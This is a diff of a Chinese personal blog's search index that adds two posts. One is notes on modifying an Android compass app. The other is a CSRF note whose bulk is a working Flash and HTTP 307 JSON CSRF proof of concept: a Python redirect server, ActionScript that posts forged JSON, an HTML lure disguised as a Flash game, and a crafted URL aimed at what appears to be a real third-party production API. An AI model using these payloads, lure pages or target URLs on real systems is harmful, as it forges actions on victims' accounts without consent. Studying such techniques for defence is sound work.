@@ -1,6 +1,91 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CSRF记录</title>
+    <url>/2025/04/17/CSRF%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="笔记-CSRF-极简分类"><a href="#笔记-CSRF-极简分类" class="headerlink" title="笔记-CSRF-极简分类"></a>笔记-CSRF-极简分类</h1><p>1-简单</p>
+<p>get+post_forms</p>
+<p>只接受三种类型，text&#x2F;plain、urlendocde、忘了</p>
+<p>2-中等</p>
+<p>限定type，例如最典型的：post-json</p>
+<p>可以尝试几种常见方式 js、flash307、WebSocket、http请求走私等</p>
+<p>*浏览器或者所在浏览的平台安全策略严谨的话建议当它没有csrf</p>
+<p>3-安全</p>
+<p>安全，以目前技术没希望的，或者只能</p>
+<p>钓鱼、xss、cors等联合漏洞实现的</p>
+<hr>
+<span id="more"></span>
+
+<h2 id="flash方法"><a href="#flash方法" class="headerlink" title="flash方法"></a>flash方法</h2><p>若是服务器只校验post+content-type：json且存在请求体，八成相当于没有csrf</p>
+<p>利用难点：	打开网址A的时候打开网址B</p>
+<p>​			若是网址接收option也可以直接用js操作</p>
+<p>​			服务器对发送种类限制，例如：json</p>
+<p>正常来说没人管这个csrf，毕竟要联合xss或者其他反射的漏洞才能造成较大危害</p>
+<p>可以用（CSRF + Flash + HTTP 307）继续绕过服务器对发送种类限制，例如：json</p>
+<h2 id="绕过json项目："><a href="#绕过json项目：" class="headerlink" title="绕过json项目："></a>绕过json项目：</h2><p><a href="https://github.com/appsecco/json-flash-csrf-poc">json-flash-csrf-poc</a></p>
+<p>*注意：需要用户浏览器启用 Flash</p>
+<p>​    	*<strong>浏览器实现可能不同</strong>  所以 <strong>307 重定向默认会变成 GET 请求</strong>（即使原请求是 POST）</p>
+<p>需要安装mxmlc命令，flex-config.xml内的playerglobal指向的参数可能要更改，以及32.0&#x2F;43或者27.0&#x2F;38</p>
+<h3 id="PoC工作流程"><a href="#PoC工作流程" class="headerlink" title="PoC工作流程"></a>PoC工作流程</h3><p>下面给出的是攻击的整个过程，其中目标用户的浏览器必须启用Flash：</p>
+<p>\1.   用户在浏览器中登录<a href="http://victim-site/">http://victim-site/</a>。</p>
+<p>\2.   用户被重定向到<a href="http://attacker-ip:8000/csrf.swf">http://attacker-ip:8000/csrf.swf</a>。</p>
+<p>\3.   Flash文件加载成功，并向<a href="http://attacker-ip:8000/">http://attacker-ip:8000/</a>发送带有自定义Header的POST Payload。</p>
+<p>\4.   攻击者的服务器发送HTTP 307重定向，这样便能让POST响应body和自定义HTTP头按原样发送到 <a href="http://victim-site/">http://victim-site/</a>。</p>
+<p>\5.   目标用户刷新自己的 <a href="http://victim-site/">http://victim-site/</a> 页面，并发现自己的帐户已经被删除了。</p>
+<h1 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;&#x27;</span></span><br><span class="line">PORT = <span class="number">8000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RedirectHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.path == <span class="string">&#x27;/csrf.swf&#x27;</span>:</span><br><span class="line">            <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">            <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-shockwave-flash&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.end_headers()</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;csrf.swf&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(f.read())</span><br><span class="line">            <span class="keyword">return</span> </span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">307</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(<span class="string">&quot;Location&quot;</span>, <span class="string">&quot;http://192.168.43.66:5000/api/test&quot;</span>)</span><br><span class="line">        <span class="comment">##该url为希望执行操作的网址</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="variable language_">self</span>.path)</span><br><span class="line">        <span class="variable language_">self</span>.do_POST()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server_class = HTTPServer</span><br><span class="line">    httpd = server_class((HOST, PORT), RedirectHandler)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s Server Starts - %s:%s&#x27;</span> % (time.asctime(), HOST <span class="keyword">or</span> <span class="string">&#x27;0.0.0.0&#x27;</span>, PORT))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    httpd.server_close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s Server Stops - %s:%s&#x27;</span> % (time.asctime(), HOST <span class="keyword">or</span> <span class="string">&#x27;0.0.0.0&#x27;</span>, PORT))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">  import flash.display.Sprite;</span><br><span class="line">  import flash.net.URLLoader;</span><br><span class="line">  import flash.net.URLRequest;</span><br><span class="line">  import flash.net.URLRequestHeader;</span><br><span class="line">  import flash.net.URLRequestMethod;</span><br><span class="line">public class csrf extends Sprite</span><br><span class="line">  &#123;</span><br><span class="line">    public function csrf()</span><br><span class="line">    &#123;</span><br><span class="line">      super();</span><br><span class="line">      var member1:Object = null;</span><br><span class="line">      var myJson:String = null;</span><br><span class="line">      member1 = new Object();</span><br><span class="line">      member1 = &#123;</span><br><span class="line">          &quot;acctnum&quot;:&quot;100&quot;,</span><br><span class="line">          &quot;confirm&quot;:&quot;true&quot;</span><br><span class="line">      &#125;;</span><br><span class="line">      var myData:Object = member1;</span><br><span class="line">      myJson = JSON.stringify(myData);</span><br><span class="line">      var url:String = &quot;http://127.0.0.1:8000&quot;;</span><br><span class="line">      ##该ip为攻击者服务器</span><br><span class="line">      var request:URLRequest = new URLRequest(url);</span><br><span class="line">      request.requestHeaders.push(new URLRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;));</span><br><span class="line">      request.data = myJson;</span><br><span class="line">      request.method = URLRequestMethod.POST;</span><br><span class="line">      var urlLoader:URLLoader = new URLLoader();</span><br><span class="line">try</span><br><span class="line">      &#123;</span><br><span class="line">          urlLoader.load(request);</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">      catch(e:Error)</span><br><span class="line">      &#123;</span><br><span class="line">          trace(e);</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">###下方代码为伪装的网页，不用也可以，只要输入攻击者ip也会被定向，效果一样的</span><br><span class="line">（会被过滤成get型）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Flash Game - Play Now!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 伪装成正常网页，诱使用户访问 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: Arial, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.flash-container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">20px</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">550px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#f9f9f9</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>🎮 Exciting Flash Game! 🎮<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Click below to play the game (requires Flash Player):<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 嵌入恶意 Flash --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;flash-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">object</span> <span class="attr">width</span>=<span class="string">&quot;550&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;movie&quot;</span> <span class="attr">value</span>=<span class="string">&quot;http://attacker-ip:8000/csrf.swf&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;http://attacker-ip:8000/csrf.swf&quot;</span> <span class="attr">width</span>=<span class="string">&quot;550&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">small</span>&gt;</span>Note: If you see a blank screen, make sure Flash Player is enabled.<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 额外伪装成正常内容 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-top: 30px;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>This game requires Adobe Flash Player. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Download here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h1><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://www.0xdawn.cn/swf_json_csrf/test.swf?endpoint=https://sim.ecloud.10086.cn:8085/simauth/app/updateAppInfo&amp;reqmethod=POST&amp;ct=application/json;charset=UTF-8&amp;jsonData=&#123;%22appId%22:%22300016001555%22,%22appName%22:%220xdawn%22&#125;&amp;php_url=https://www.0xdawn.cn/swf_json_csrf/test.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="csrf漏洞详解网址："><a href="#csrf漏洞详解网址：" class="headerlink" title="csrf漏洞详解网址："></a>csrf漏洞详解网址：</h1><p><a href="https://xz.aliyun.com/news/7506">一次渗透测试引发的Json格式下CSRF攻击的探索-先知社区</a></p>
+<p>..&#x2F;_code&#x2F;csrf</p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>web-net</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>指南针-导航</title>
+    <url>/2025/04/01/%E5%AF%BC%E8%88%AA/</url>
+    <content><![CDATA[<h1 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h1><p>主要：<a href="https://github.com/Kr0oked/Compass">指南针项目</a></p>
+<p>后端：<a href="">步行规划</a></p>
+<h1 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h1><p>获取磁场传感器、加速度传感器，得到方向角。打开app的一瞬间以手机方向为arrow_image.png的指向角度</p>
+<p>偏转角度：</p>
+<p>定位指向真北的角度+正北顺时针到目标经纬度的角度</p>
+<p>以定位更改为刷新	&#x2F;&#x2F;	以每2s为更新次数</p>
+<p>难点：</p>
+<p>对Android Studio完全陌生，即便更改别人的指南针项目也一定时间无法搞懂其项目结构，对java的不熟悉更是难以下脚</p>
+<p>语音的接入以及服务器发包和接包这几个功能点的嵌入无从动手</p>
+<p>做法：</p>
+<p>先更改其ui来熟悉项目结构</p>
+<p>新增功能点，只要接入角度的偏转就行</p>
+<span id="more"></span>
+
+<h2 id="内容更改"><a href="#内容更改" class="headerlink" title="内容更改"></a>内容更改</h2><p>\Compass-master\Compass-master\app\src\main\java\com\bobek\compass\CompassFragment.kt<br>—&gt;updateCompass</p>
+<p>\Downloads\Compass-master\Compass-master\app\src\main\res\layout\compass_view.xml<br>@+id&#x2F;cardinal_direction_north_text—–北</p>
+<p>\Compass-master\Compass-master\app\src\main\res\values-zh\strings.xml</p>
+<p>更改参考文字</p>
+<p>###########需要更改<br>\Compass-master\Compass-master\app\src\main\java\com\bobek\compass\view\CompassView.kt<br>R.string.degrees—动态更改距离</p>
+<p>\Compass-master\Compass-master\app\src\main\java\com\bobek\compass\model\Azimuth.kt<br>val degrees—偏转角度</p>
+<h6 id="方向角的计算公式："><a href="#方向角的计算公式：" class="headerlink" title="方向角的计算公式："></a>方向角的计算公式：</h6><p><img src="/..%5Cimage%5Cmap-app%5Cazimuth.png" alt="azimuth"></p>
+]]></content>
+      <categories>
+        <category>Android Studio</category>
+      </categories>
+      <tags>
+        <tag>Android Studio</tag>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>前端游走</title>
     <url>/2025/03/04/%E5%89%8D%E7%AB%AF%E6%B8%B8%E8%B5%B0/</url>
     <content><![CDATA[<h1 id="前端加密对抗"><a href="#前端加密对抗" class="headerlink" title="前端加密对抗"></a>前端加密对抗</h1><p>网址教学：<a href="https://xz.aliyun.com/news/14066">https://xz.aliyun.com/news/14066</a></p>
@@ -226,8 +311,8 @@
         <category>Cybersecurity</category>
       </categories>
       <tags>
-        <tag>web</tag>
         <tag>api</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -329,8 +414,8 @@
         <category>Cybersecurity</category>
       </categories>
       <tags>
-        <tag>api</tag>
         <tag>js</tag>
+        <tag>api</tag>
         <tag>Cybersecurity</tag>
         <tag>jwt</tag>
         <tag>keys</tag>
@@ -442,9 +527,9 @@
         <category>Cybersecurity</category>
       </categories>
       <tags>
+        <tag>web</tag>
         <tag>Information</tag>
         <tag>Official account</tag>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -481,8 +566,8 @@
         <category>Cybersecurity</category>
       </categories>
       <tags>
-        <tag>Cybersecurity</tag>
         <tag>Honeypot</tag>
+        <tag>Cybersecurity</tag>
         <tag>Information Gathering</tag>
         <tag>Intrusion Detection</tag>
         <tag>Attack Analysis</tag>
